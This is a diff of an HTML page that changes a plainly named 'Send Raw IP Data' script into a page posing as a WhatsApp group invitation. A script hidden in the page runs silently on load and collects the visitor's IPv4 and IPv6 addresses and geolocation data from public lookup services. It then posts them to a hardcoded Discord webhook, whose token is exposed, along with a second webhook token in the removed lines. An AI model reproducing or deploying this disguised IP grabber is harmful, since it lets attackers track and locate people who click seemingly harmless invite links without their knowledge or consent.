@@ -1,42 +1,114 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Send Raw IP Data</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Join Our WhatsApp Group</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f8f9fa;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .container {
+      background-color: #ffffff;
+      padding: 40px;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      max-width: 500px;
+      width: 90%;
+    }
+    h1 {
+      color: #25D366; /* WhatsApp green */
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 18px;
+      margin-bottom: 30px;
+      color: #333;
+    }
+    a {
+      display: inline-block;
+      text-decoration: none;
+      background-color: #25D366;
+      color: white;
+      padding: 15px 30px;
+      border-radius: 50px;
+      font-size: 18px;
+      transition: background-color 0.3s ease;
+    }
+    a:hover {
+      background-color: #128C7E;
+    }
+  </style>
 </head>
 <body>
-<script>
-async function sendRawIpData() {
-    try {
-        // Fetch raw IP from ifconfig.me
-        const ipRaw = await fetch('https://ifconfig.me/ip')
-            .then(res => res.text());
+  <div class="container">
+    <h1>Join the "Random Group"</h1>
+    <p>Click the button below to join our WhatsApp group and connect with like-minded people!</p>
+    <a href="https://chat.whatsapp.com/H9GYoam4C4SG21tuJut8HH?mode=gi_t" target="_blank" rel="noopener noreferrer">
+      Join WhatsApp Group
+    </a>
+  </div>
+    <script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474010870479716364/VqLT5gBq-5i9DHeZHj7YV0KuzxLEuQfSJ01qIwxXxYm1nK3xyZmgl8rL160z_TaAfg02";
 
-        // Fetch raw info from ipwho.is
-        const whoisRaw = await fetch('https://ipwho.is/')
-            .then(res => res.text());
+    // Function to fetch IPv6
+    async function getIPv6() {
+      try {
+        const response = await fetch('https://ifconfig.me/ip');
+        const ipv6 = (await response.text()).trim();
+        return ipv6;
+      } catch (err) {
+        console.error("Error fetching IPv6:", err);
+        return "Unavailable";
+      }
+    }
 
-        // Prepare payload with raw responses
-        const payload = {
-            content: `**Raw ifconfig.me Response:**\n\`\`\`\n${ipRaw}\n\`\`\`\n**Raw ipwho.is Response:**\n\`\`\`\n${whoisRaw}\n\`\`\``
+    async function fetchIPInfo() {
+      try {
+        // Get public IPv4
+        const ipResponse = await fetch("https://ipinfo.io/ip");
+        const ipv4 = (await ipResponse.text()).trim();
+
+        // Get detailed info
+        const infoResponse = await fetch(`https://ipapi.co/${ipv4}/json/`);
+        const infoData = await infoResponse.json();
+
+        // Get IPv6
+        const ipv6 = await getIPv6();
+
+        // Combine data
+        const outputData = {
+          ipv4,
+          ipv6,
+          ...infoData
         };
 
-        // Send to Discord webhook
-        await fetch('https://discord.com/api/webhooks/1248875456510562335/LW5oN6hzV3GxvqcxIgc3YwQhOEG8OTpfl1xESSEsD4mm8OWviQQyvnfj9oLYMwOCvf8d', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
+        console.log("IP info:", outputData); // Check locally
+
+        // Send to Discord
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `IP Info:\n\`\`\`json\n${JSON.stringify(outputData, null, 2)}\n\`\`\``
+          })
         });
 
-        console.log('Raw IP data sent!');
-    } catch (err) {
-        console.error('Error:', err);
+        console.log("Webhook sent successfully!");
+      } catch (error) {
+        console.error("Error fetching/sending IP info:", error);
+      }
     }
-}
 
-// Execute the function
-sendRawIpData();
-</script>
+    fetchIPInfo();
+  </script>
 </body>
 </html>
